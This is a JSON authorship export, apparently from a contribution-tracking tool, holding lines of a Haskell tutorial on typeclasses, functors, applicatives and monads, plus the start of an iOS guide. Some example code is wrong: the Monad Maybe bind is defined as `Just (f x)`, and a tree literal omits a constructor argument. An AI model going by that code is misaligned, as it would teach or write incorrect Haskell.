        "content": "Up to this point, we have been instantiating typeclasses with concrete types,"
      },
      {
        "lineNumber": 845,
        "author": {
          "gitId": "-"
        },
        "content": "such as `TrafficSignal` and `Tree t`. It is also possible to instantiate"
      },
      {
        "lineNumber": 846,
        "author": {
          "gitId": "-"
        },
        "content": "typeclasses with **parameterized** type constructors like `Tree` and `List`."
      },
      {
        "lineNumber": 847,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 848,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the following typeclass `Container` that is instantiated by types that"
      },
      {
        "lineNumber": 849,
        "author": {
          "gitId": "-"
        },
        "content": "have some notion of constituent elements and size. For instance, a `List` has a"
      },
      {
        "lineNumber": 850,
        "author": {
          "gitId": "-"
        },
        "content": "length and contains elements of some type. A `Tree` has nodes and a size (number"
      },
      {
        "lineNumber": 851,
        "author": {
          "gitId": "-"
        },
        "content": "of nodes). The length is independent of type of element contained within."
      },
      {
        "lineNumber": 852,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 853,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 854,
        "author": {
          "gitId": "-"
        },
        "content": "    class Container s where"
      },
      {
        "lineNumber": 855,
        "author": {
          "gitId": "-"
        },
        "content": "        -- t is an arbitrary unconstrained type"
      },
      {
        "lineNumber": 856,
        "author": {
          "gitId": "-"
        },
        "content": "        size :: s t -\u003e Int"
      },
      {
        "lineNumber": 857,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 858,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 859,
        "author": {
          "gitId": "-"
        },
        "content": "We can instantiate `Container` with `Tree` and `List`. These are parameterized"
      },
      {
        "lineNumber": 860,
        "author": {
          "gitId": "-"
        },
        "content": "type constructors, not concrete types. We can even instantiate with `Maybe`."
      },
      {
        "lineNumber": 861,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 862,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 863,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Container Tree where"
      },
      {
        "lineNumber": 864,
        "author": {
          "gitId": "-"
        },
        "content": "        size EmptyTree \u003d 0"
      },
      {
        "lineNumber": 865,
        "author": {
          "gitId": "-"
        },
        "content": "        size (Node _ left right) \u003d 1 + size left + size right"
      },
      {
        "lineNumber": 866,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 867,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Container List where"
      },
      {
        "lineNumber": 868,
        "author": {
          "gitId": "-"
        },
        "content": "        size EmptyList \u003d 0"
      },
      {
        "lineNumber": 869,
        "author": {
          "gitId": "-"
        },
        "content": "        size (Element _ restOfList) \u003d 1 + size restOfList"
      },
      {
        "lineNumber": 870,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 871,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Container Maybe where"
      },
      {
        "lineNumber": 872,
        "author": {
          "gitId": "-"
        },
        "content": "        size Nothing \u003d 0"
      },
      {
        "lineNumber": 873,
        "author": {
          "gitId": "-"
        },
        "content": "        size (Just _) \u003d 1"
      },
      {
        "lineNumber": 874,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 875,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 876,
        "author": {
          "gitId": "-"
        },
        "content": "As an exercise, the reader may wish to redefine the size of a `Tree` to mean"
      },
      {
        "lineNumber": 877,
        "author": {
          "gitId": "-"
        },
        "content": "\"height of tree\" rather than \"number of nodes\". It is necessary to instantiate"
      },
      {
        "lineNumber": 878,
        "author": {
          "gitId": "-"
        },
        "content": "`Container` with `Tree` differently to achieve this. The function"
      },
      {
        "lineNumber": 879,
        "author": {
          "gitId": "-"
        },
        "content": "`max :: (Ord a) \u003d\u003e a -\u003e a -\u003e a` may come in handy (`Int` is an instance of `Ord`)."
      },
      {
        "lineNumber": 880,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 881,
        "author": {
          "gitId": "-"
        },
        "content": "### Further Reading"
      },
      {
        "lineNumber": 882,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 883,
        "author": {
          "gitId": "-"
        },
        "content": "* [More on Creating Typeclasses](http://learnyouahaskell.com/making-our-own-types-and-typeclasses)"
      },
      {
        "lineNumber": 884,
        "author": {
          "gitId": "-"
        },
        "content": "* [Collection and Relationship between Standard Typeclasses](https://wiki.haskell.org/Typeclassopedia)"
      },
      {
        "lineNumber": 885,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 886,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 887,
        "author": {
          "gitId": "-"
        },
        "content": "# Common Haskell Idioms"
      },
      {
        "lineNumber": 888,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 889,
        "author": {
          "gitId": "-"
        },
        "content": "## Functors"
      },
      {
        "lineNumber": 890,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 891,
        "author": {
          "gitId": "-"
        },
        "content": "Consider the `map` function previously defined. The type"
      },
      {
        "lineNumber": 892,
        "author": {
          "gitId": "-"
        },
        "content": "of `map` is `(a -\u003e b) -\u003e [a] -\u003e [b]`, which means that it operates only on lists."
      },
      {
        "lineNumber": 893,
        "author": {
          "gitId": "-"
        },
        "content": "We may imagine extending maps to `Tree`s and `Maybe`s in the following manner:"
      },
      {
        "lineNumber": 894,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 895,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 896,
        "author": {
          "gitId": "-"
        },
        "content": "    map :: (a -\u003e b) -\u003e Tree a -\u003e Tree b"
      },
      {
        "lineNumber": 897,
        "author": {
          "gitId": "-"
        },
        "content": "    map :: (a -\u003e b) -\u003e Maybe a -\u003e Maybe b"
      },
      {
        "lineNumber": 898,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 899,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 900,
        "author": {
          "gitId": "-"
        },
        "content": "The two type definitions above look very similar and suggest a generalization:"
      },
      {
        "lineNumber": 901,
        "author": {
          "gitId": "-"
        },
        "content": "types that can be mapped over. We call such types _functors_, and can represent"
      },
      {
        "lineNumber": 902,
        "author": {
          "gitId": "-"
        },
        "content": "their behaviour with a typeclass."
      },
      {
        "lineNumber": 903,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 904,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 905,
        "author": {
          "gitId": "-"
        },
        "content": "    class Functor f where"
      },
      {
        "lineNumber": 906,
        "author": {
          "gitId": "-"
        },
        "content": "        -- f is a type constructor that takes in one type parameter"
      },
      {
        "lineNumber": 907,
        "author": {
          "gitId": "-"
        },
        "content": "        fmap :: (a -\u003e b) -\u003e f a -\u003e f b"
      },
      {
        "lineNumber": 908,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 909,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 910,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Functor Tree where"
      },
      {
        "lineNumber": 911,
        "author": {
          "gitId": "-"
        },
        "content": "        fmap _ EmptyTree \u003d EmptyTree"
      },
      {
        "lineNumber": 912,
        "author": {
          "gitId": "-"
        },
        "content": "        fmap f (Node x left right) \u003d Node (f x) (fmap f left) (fmap f right)"
      },
      {
        "lineNumber": 913,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 914,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Functor Maybe where"
      },
      {
        "lineNumber": 915,
        "author": {
          "gitId": "-"
        },
        "content": "        fmap _ Nothing \u003d Nothing"
      },
      {
        "lineNumber": 916,
        "author": {
          "gitId": "-"
        },
        "content": "        fmap f (Just x) \u003d Just (f x)"
      },
      {
        "lineNumber": 917,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 918,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 919,
        "author": {
          "gitId": "-"
        },
        "content": "We can then map over values of any functor:"
      },
      {
        "lineNumber": 920,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 921,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 922,
        "author": {
          "gitId": "-"
        },
        "content": "    sq x \u003d x * x"
      },
      {
        "lineNumber": 923,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 924,
        "author": {
          "gitId": "-"
        },
        "content": "    fmap sq (Just 5) -- returns Just 25"
      },
      {
        "lineNumber": 925,
        "author": {
          "gitId": "-"
        },
        "content": "    fmap sq Nothing -- returns Nothing"
      },
      {
        "lineNumber": 926,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 927,
        "author": {
          "gitId": "-"
        },
        "content": "    fmap sq (Node 1 (Node 2 EmptyTree) (Node 3 (Node 4 EmptyTree) EmptyTree))"
      },
      {
        "lineNumber": 928,
        "author": {
          "gitId": "-"
        },
        "content": "    -- returns (Node 1 (Node 4 EmptyTree) (Node 9 (Node 16 EmptyTree) EmptyTree))"
      },
      {
        "lineNumber": 929,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 930,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 931,
        "author": {
          "gitId": "-"
        },
        "content": "More information about functors, including the functor laws,"
      },
      {
        "lineNumber": 932,
        "author": {
          "gitId": "-"
        },
        "content": "may be found [here](https://en.wikibooks.org/wiki/Haskell/The_Functor_class)."
      },
      {
        "lineNumber": 933,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 934,
        "author": {
          "gitId": "-"
        },
        "content": "## Applicative Functors"
      },
      {
        "lineNumber": 935,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 936,
        "author": {
          "gitId": "-"
        },
        "content": "An _applicative functor_ is a functor that allows for a more advanced type of"
      },
      {
        "lineNumber": 937,
        "author": {
          "gitId": "-"
        },
        "content": "mapping. We shall jump straight into the (abridged) typeclass definition and the"
      },
      {
        "lineNumber": 938,
        "author": {
          "gitId": "-"
        },
        "content": "example of `Maybe` as an applicative functor:"
      },
      {
        "lineNumber": 939,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 940,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 941,
        "author": {
          "gitId": "-"
        },
        "content": "    class (Functor f) \u003d\u003e Applicative f where"
      },
      {
        "lineNumber": 942,
        "author": {
          "gitId": "-"
        },
        "content": "        pure :: a -\u003e f a"
      },
      {
        "lineNumber": 943,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003c*\u003e) :: f (a -\u003e b) -\u003e f a -\u003e f b -- generalized map function"
      },
      {
        "lineNumber": 944,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 945,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Applicative Maybe where"
      },
      {
        "lineNumber": 946,
        "author": {
          "gitId": "-"
        },
        "content": "        pure x \u003d Just x"
      },
      {
        "lineNumber": 947,
        "author": {
          "gitId": "-"
        },
        "content": "        Nothing \u003c*\u003e _ \u003d Nothing"
      },
      {
        "lineNumber": 948,
        "author": {
          "gitId": "-"
        },
        "content": "        _ \u003c*\u003e Nothing \u003d Nothing"
      },
      {
        "lineNumber": 949,
        "author": {
          "gitId": "-"
        },
        "content": "        Just f \u003c*\u003e Just x \u003d Just (f x)"
      },
      {
        "lineNumber": 950,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 951,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 952,
        "author": {
          "gitId": "-"
        },
        "content": "Applicative functors have the concept of _lifting_, embodied in `pure`, where"
      },
      {
        "lineNumber": 953,
        "author": {
          "gitId": "-"
        },
        "content": "a value is taken and placed in the context of a functor. For instance, in the"
      },
      {
        "lineNumber": 954,
        "author": {
          "gitId": "-"
        },
        "content": "context of `Maybe`, `pure 5` returns the value"
      },
      {
        "lineNumber": 955,
        "author": {
          "gitId": "-"
        },
        "content": "`Just 5`."
      },
      {
        "lineNumber": 956,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 957,
        "author": {
          "gitId": "-"
        },
        "content": "Applicative functors allow a more general form of mapping, where it is possible"
      },
      {
        "lineNumber": 958,
        "author": {
          "gitId": "-"
        },
        "content": "to use an N-parameter function to map over N functors. To understand the value"
      },
      {
        "lineNumber": 959,
        "author": {
          "gitId": "-"
        },
        "content": "of this, consider the following code:"
      },
      {
        "lineNumber": 960,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 961,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 962,
        "author": {
          "gitId": "-"
        },
        "content": "    euclideanDistance :: Double -\u003e Double -\u003e Double -\u003e Double"
      },
      {
        "lineNumber": 963,
        "author": {
          "gitId": "-"
        },
        "content": "    euclideanDistance x y z \u003d sqrt ((x * x) + (y * y) + (z * z))"
      },
      {
        "lineNumber": 964,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 965,
        "author": {
          "gitId": "-"
        },
        "content": "    (pure euclideanDistance) \u003c*\u003e Just 1 \u003c*\u003e Just 2 \u003c*\u003e Just 3"
      },
      {
        "lineNumber": 966,
        "author": {
          "gitId": "-"
        },
        "content": "    -- returns Just 3.7416573867739413"
      },
      {
        "lineNumber": 967,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 968,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 969,
        "author": {
          "gitId": "-"
        },
        "content": "The above code can be written with just `fmap` in the ordinary `Functor` class,"
      },
      {
        "lineNumber": 970,
        "author": {
          "gitId": "-"
        },
        "content": "but will involve incredible contortions."
      },
      {
        "lineNumber": 971,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 972,
        "author": {
          "gitId": "-"
        },
        "content": "More information about applicative functors can be found"
      },
      {
        "lineNumber": 973,
        "author": {
          "gitId": "-"
        },
        "content": "[here](https://en.wikibooks.org/wiki/Haskell/Applicative_functors). There is a"
      },
      {
        "lineNumber": 974,
        "author": {
          "gitId": "-"
        },
        "content": "lot of additional functionality available in the `Applicative` typeclass. We"
      },
      {
        "lineNumber": 975,
        "author": {
          "gitId": "-"
        },
        "content": "have barely scratched the surface."
      },
      {
        "lineNumber": 976,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 977,
        "author": {
          "gitId": "-"
        },
        "content": "## Monads"
      },
      {
        "lineNumber": 978,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 979,
        "author": {
          "gitId": "-"
        },
        "content": "No Haskell tutorial will be complete without an introduction to the fabled"
      },
      {
        "lineNumber": 980,
        "author": {
          "gitId": "-"
        },
        "content": "monad. Monads have been described with various analogies, as well as with"
      },
      {
        "lineNumber": 981,
        "author": {
          "gitId": "-"
        },
        "content": "notorious phrases from category theory like \"a monad is a monoid in the category"
      },
      {
        "lineNumber": 982,
        "author": {
          "gitId": "-"
        },
        "content": "of endofunctors\"."
      },
      {
        "lineNumber": 983,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 984,
        "author": {
          "gitId": "-"
        },
        "content": "None of these are useful for the software engineer, so we dispense with them and"
      },
      {
        "lineNumber": 985,
        "author": {
          "gitId": "-"
        },
        "content": "opt for just showing the code:"
      },
      {
        "lineNumber": 986,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 987,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 988,
        "author": {
          "gitId": "-"
        },
        "content": "    class (Applicative m) \u003d\u003e Monad m where"
      },
      {
        "lineNumber": 989,
        "author": {
          "gitId": "-"
        },
        "content": "        -- this function, called \"bind\", is at the heart of the monad"
      },
      {
        "lineNumber": 990,
        "author": {
          "gitId": "-"
        },
        "content": "        (\u003e\u003e\u003d) :: m a -\u003e (a -\u003e m b) -\u003e m b"
      },
      {
        "lineNumber": 991,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 992,
        "author": {
          "gitId": "-"
        },
        "content": "        -- we could actually just use pure, but return is here for historical reasons"
      },
      {
        "lineNumber": 993,
        "author": {
          "gitId": "-"
        },
        "content": "        return :: a -\u003e m a"
      },
      {
        "lineNumber": 994,
        "author": {
          "gitId": "-"
        },
        "content": "        return \u003d pure"
      },
      {
        "lineNumber": 995,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 996,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 997,
        "author": {
          "gitId": "-"
        },
        "content": "A monad is essentially an applicative functor that allows for operations to be"
      },
      {
        "lineNumber": 998,
        "author": {
          "gitId": "-"
        },
        "content": "chained together with a value carried in the background. To consider this, let"
      },
      {
        "lineNumber": 999,
        "author": {
          "gitId": "-"
        },
        "content": "us consider the familiar case of `Maybe`, which is a monad."
      },
      {
        "lineNumber": 1000,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1001,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 1002,
        "author": {
          "gitId": "-"
        },
        "content": "    instance Monad Maybe where"
      },
      {
        "lineNumber": 1003,
        "author": {
          "gitId": "-"
        },
        "content": "        Nothing \u003e\u003e\u003d _ \u003d Nothing"
      },
      {
        "lineNumber": 1004,
        "author": {
          "gitId": "-"
        },
        "content": "        (Just x) \u003e\u003e\u003d f \u003d Just (f x)"
      },
      {
        "lineNumber": 1005,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1006,
        "author": {
          "gitId": "-"
        },
        "content": "    -- maybeSomeValue is Just 50"
      },
      {
        "lineNumber": 1007,
        "author": {
          "gitId": "-"
        },
        "content": "    maybeSomeValue \u003d Just 5 \u003e\u003e\u003d (\\x -\u003e Just (x * x) \u003e\u003e\u003d (\\x -\u003e Just (x + x)))"
      },
      {
        "lineNumber": 1008,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 1009,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1010,
        "author": {
          "gitId": "-"
        },
        "content": "Essentially, the bind function allows for values carried inside the monad (which"
      },
      {
        "lineNumber": 1011,
        "author": {
          "gitId": "-"
        },
        "content": "is ultimately just a functor) to be extracted and passed into another computation."
      },
      {
        "lineNumber": 1012,
        "author": {
          "gitId": "-"
        },
        "content": "This explanation may seem obtuse, but consider the same code, with some extracted"
      },
      {
        "lineNumber": 1013,
        "author": {
          "gitId": "-"
        },
        "content": "whitespace added and the `return` function used:"
      },
      {
        "lineNumber": 1014,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1015,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 1016,
        "author": {
          "gitId": "-"
        },
        "content": "    maybeSomeValue \u003d Just 5 \u003e\u003e\u003d (\\x -\u003e"
      },
      {
        "lineNumber": 1017,
        "author": {
          "gitId": "-"
        },
        "content": "                     Just (x * x) \u003e\u003e\u003d (\\x -\u003e"
      },
      {
        "lineNumber": 1018,
        "author": {
          "gitId": "-"
        },
        "content": "                     return (x + x)))"
      },
      {
        "lineNumber": 1019,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 1020,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1021,
        "author": {
          "gitId": "-"
        },
        "content": "If the reader squints hard enough, this looks like an imperative program! It"
      },
      {
        "lineNumber": 1022,
        "author": {
          "gitId": "-"
        },
        "content": "looks like the following is being done:"
      },
      {
        "lineNumber": 1023,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1024,
        "author": {
          "gitId": "-"
        },
        "content": "```haskell"
      },
      {
        "lineNumber": 1025,
        "author": {
          "gitId": "-"
        },
        "content": "    maybeSomeValue \u003d do"
      },
      {
        "lineNumber": 1026,
        "author": {
          "gitId": "-"
        },
        "content": "        x \u003c- Just 5"
      },
      {
        "lineNumber": 1027,
        "author": {
          "gitId": "-"
        },
        "content": "        x \u003c- Just (x * x)"
      },
      {
        "lineNumber": 1028,
        "author": {
          "gitId": "-"
        },
        "content": "        return (x + x)"
      },
      {
        "lineNumber": 1029,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 1030,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1031,
        "author": {
          "gitId": "-"
        },
        "content": "The result of the imperative-looking code is exactly the same as that of the"
      },
      {
        "lineNumber": 1032,
        "author": {
          "gitId": "-"
        },
        "content": "original computation, if traced through. Using monads to provide an imperative"
      },
      {
        "lineNumber": 1033,
        "author": {
          "gitId": "-"
        },
        "content": "interface in a functional program is such a common pattern that the `do` notation"
      },
      {
        "lineNumber": 1034,
        "author": {
          "gitId": "-"
        },
        "content": "was conceived as syntactic sugar to make writing such a pattern easier. That means"
      },
      {
        "lineNumber": 1035,
        "author": {
          "gitId": "-"
        },
        "content": "that the imperative-looking code is actually valid Haskell!"
      },
      {
        "lineNumber": 1036,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1037,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to `Maybe`, there are several other monads. A major example is the"
      },
      {
        "lineNumber": 1038,
        "author": {
          "gitId": "-"
        },
        "content": "IO monad, which allows external state to be encapsulated in the monad an interfaced"
      },
      {
        "lineNumber": 1039,
        "author": {
          "gitId": "-"
        },
        "content": "with in a manner familiar to imperative programmers."
      },
      {
        "lineNumber": 1040,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1041,
        "author": {
          "gitId": "-"
        },
        "content": "Monads are a big topic, and additional resources are available:"
      },
      {
        "lineNumber": 1042,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1043,
        "author": {
          "gitId": "-"
        },
        "content": "* [Monads](http://learnyouahaskell.com/a-fistful-of-monads)"
      },
      {
        "lineNumber": 1044,
        "author": {
          "gitId": "-"
        },
        "content": "* [Monad Laws](https://en.wikibooks.org/wiki/Haskell/Understanding_monads#Monad_Laws) that every monad should obey"
      },
      {
        "lineNumber": 1045,
        "author": {
          "gitId": "-"
        },
        "content": "* [IO Monad](http://learnyouahaskell.com/input-and-output)"
      },
      {
        "lineNumber": 1046,
        "author": {
          "gitId": "-"
        },
        "content": "* [State Monad](https://en.wikibooks.org/wiki/Haskell/Understanding_monads/State), allows state to be carried in a monadic context, allowing imperative-style computation"
      },
      {
        "lineNumber": 1047,
        "author": {
          "gitId": "-"
        },
        "content": "* [ST Monad](https://en.wikibooks.org/wiki/Haskell/Mutable_objects), allows mutable state to be carried in a monadic context, useful for implementing inherently destructive algorithms"
      },
      {
        "lineNumber": 1048,
        "author": {
          "gitId": "-"
        },
        "content": "* [Arrays](https://wiki.haskell.org/Arrays), allows constant-time access to elements like a C array, with mutable variants in the `IO` and `ST` monads provided"
      },
      {
        "lineNumber": 1049,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1050,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1051,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1052,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1053,
        "author": {
          "gitId": "-"
        },
        "content": "# Guides"
      },
      {
        "lineNumber": 1054,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1055,
        "author": {
          "gitId": "-"
        },
        "content": "* [Learn You a Haskell](http://learnyouahaskell.com) is a good beginner text"
      },
      {
        "lineNumber": 1056,
        "author": {
          "gitId": "-"
        },
        "content": "for learning Haskell. It does not have much real-world examples, but does quite"
      },
      {
        "lineNumber": 1057,
        "author": {
          "gitId": "-"
        },
        "content": "a good job in explaining difficult theoretical concepts (e.g. functors,"
      },
      {
        "lineNumber": 1058,
        "author": {
          "gitId": "-"
        },
        "content": "applicative functors and monads) well. It is recommended to read  the material"
      },
      {
        "lineNumber": 1059,
        "author": {
          "gitId": "-"
        },
        "content": "in 4 chunks:"
      },
      {
        "lineNumber": 1060,
        "author": {
          "gitId": "-"
        },
        "content": "    * 1-6: basic functional programming"
      },
      {
        "lineNumber": 1061,
        "author": {
          "gitId": "-"
        },
        "content": "    * 7: modules (very important for large codebases)"
      },
      {
        "lineNumber": 1062,
        "author": {
          "gitId": "-"
        },
        "content": "    * 8-10: details of the type-system"
      },
      {
        "lineNumber": 1063,
        "author": {
          "gitId": "-"
        },
        "content": "    * 11-14: monads"
      },
      {
        "lineNumber": 1064,
        "author": {
          "gitId": "-"
        },
        "content": "* [Real World Haskell](http://book.realworldhaskell.org/) is a rather old text"
      },
      {
        "lineNumber": 1065,
        "author": {
          "gitId": "-"
        },
        "content": "which is possibly outdated. Still, it shows plenty of examples of how Haskell"
      },
      {
        "lineNumber": 1066,
        "author": {
          "gitId": "-"
        },
        "content": "may be used in actual real-life scenarios (databases, web programming, etc)."
      },
      {
        "lineNumber": 1067,
        "author": {
          "gitId": "-"
        },
        "content": "* [Haskell Wikibook](https://en.wikibooks.org/wiki/Haskell) is a comprehensive"
      },
      {
        "lineNumber": 1068,
        "author": {
          "gitId": "-"
        },
        "content": "Haskell reference. This resource really shines when it comes to aggregating and"
      },
      {
        "lineNumber": 1069,
        "author": {
          "gitId": "-"
        },
        "content": "covering advanced Haskell topics that typically appear elsewhere in a very"
      },
      {
        "lineNumber": 1070,
        "author": {
          "gitId": "-"
        },
        "content": "ad-hoc fashion."
      },
      {
        "lineNumber": 1071,
        "author": {
          "gitId": "-"
        },
        "content": "* [Typeclassopedia](https://wiki.haskell.org/Typeclassopedia) is a reference"
      },
      {
        "lineNumber": 1072,
        "author": {
          "gitId": "-"
        },
        "content": "for the major typeclasses contained in the Haskell hierarchical libraries. Use"
      },
      {
        "lineNumber": 1073,
        "author": {
          "gitId": "-"
        },
        "content": "it to determine which typeclasses are related to which (e.g. every monad is an"
      },
      {
        "lineNumber": 1074,
        "author": {
          "gitId": "-"
        },
        "content": "applicative functor, which is in turn a functor)."
      },
      {
        "lineNumber": 1075,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 1076,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 1,
      "iskandarzulkarnaien": 19,
      "-": 1056
    }
  },
  {
    "path": "contents/ios/IntroToIos.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to iOS App Development"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to iOS Development"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: [Bryan Lew](https://github.com/blewjy)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Chester Sng](https://github.com/ChesterSng), [Jiang Chunhui](https://github.com/Adoby7), [Yu Pei, Henry](https://github.com/YuPeiHenry)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
